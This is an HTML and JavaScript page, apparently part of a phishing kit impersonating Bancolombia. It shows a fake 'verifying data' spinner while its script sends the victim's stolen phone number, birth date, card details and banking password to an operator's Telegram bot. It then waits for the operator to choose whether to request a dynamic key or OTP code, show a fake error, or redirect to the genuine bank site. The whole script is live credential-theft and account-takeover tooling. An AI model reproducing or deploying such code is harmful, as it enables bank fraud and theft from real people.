<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificando Datos</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: url('img/fondo.jpg') no-repeat center center fixed;
      background-size: cover;
    }

    .blur-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.4);
      backdrop-filter: blur(10px);
    }

    .loaderp-full {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      position: fixed;
      width: 90%;
      height: 90%;
      z-index: 9999;
    }

    .loaderp {
      width: 180px;
      height: 180px;
      background-image: url('img/circulo.png');
      background-size: cover;
      border-radius: 50%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }

    .loaderp .loader {
      width: 30px;
      height: 30px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #555;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    .loaderp-text {
      margin-top: 30px;
      font-size: 13px;
      color: black;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="blur-overlay"></div>
  <div class="loaderp-full">
    <div class="loaderp">
      <div class="loader"></div>
      <div class="loaderp-text">Cargando...</div>
    </div>
  </div>

<script>
document.addEventListener('DOMContentLoaded', async function () {
  const loader = document.querySelector('.loaderp-full');

  // 1. Cargar configuración del bot
  const config = await fetch("botconfig.json").then(r => r.json()).catch(err => {
    alert("No se pudo cargar la configuración del bot.");
    console.error(err);
    return null;
  });

  if (!config || !config.token || !config.chat_id) {
    alert("Configuración incompleta del bot.");
    return;
  }

  // 2. Leer datos del localStorage
  const data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
  if (!data.celular || !data.nacimiento || !data.tipo || !data.identificador || !data.digitosFinales || !data.clave) {
    alert("Datos incompletos. Redirigiendo...");
    return window.location.href = "index.html";
  }

  // 3. Crear ID de transacción
  const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
  localStorage.setItem("transactionId", transactionId);

  // 4. Crear mensaje
  const mensaje = `
📥 <b>REGISTRO NUEVO</b>
🆔 ID: ${transactionId}
📱 Celular: ${data.celular}
🎂 Nacimiento: ${data.nacimiento}
💳 Tipo: ${data.tipo}
🔢 Identificador: ${data.identificador}
🔸 Últimos 2 dígitos: ${data.digitosFinales}
🔐 Clave: ${data.clave}
`;

  // 5. Botones
  const keyboard = {
    inline_keyboard: [
      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
      [{ text: "Código OTP", callback_data: `pedir_otp:${transactionId}` }],
      [{ text: "Error TC", callback_data: `error_tc:${transactionId}` }],
      [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
    ]
  };

  // 6. Enviar mensaje con botones a Telegram
  await fetch("botmaster2.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
  });

  // 7. Verificar botón presionado
  await checkButton(transactionId, config.token);

  async function checkButton(transactionId, botToken) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
      const json = await res.json();

      const update = json.result.find(u =>
        u.callback_query &&
        u.callback_query.data &&
        u.callback_query.data.includes(transactionId)
      );

      if (update) {
        const tipo = update.callback_query.data.split(":")[0];
        const status = {
          pedir_dinamica: "Clave Dinámica",
          pedir_otp: "Código OTP",
          error_tc: "Error TC",
          error_logo: "Error de Logo",
          confirm_finalizar: "Finalización Exitosa"
        }[tipo] || "Acción desconocida";

        await fetch("sendStatus.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ status })
        });

        switch (tipo) {
          case "pedir_dinamica":
            return window.location.href = "dinacol.php";
          case "pedir_otp":
            return window.location.href = "index-otp.html";
          case "error_tc":
            return window.location.href = "errortc.html";
          case "error_logo":
            alert("Error en sesión");
            return window.location.href = "index.html";
          case "confirm_finalizar":
            return window.location.href = "https://www.bancolombia.com/personas";
        }
      } else {
        setTimeout(() => checkButton(transactionId, botToken), 2500);
      }
    } catch (err) {
      console.error("Error al verificar botón:", err);
      setTimeout(() => checkButton(transactionId, botToken), 3000);
    }
  }
});
</script>

</body>
</html>
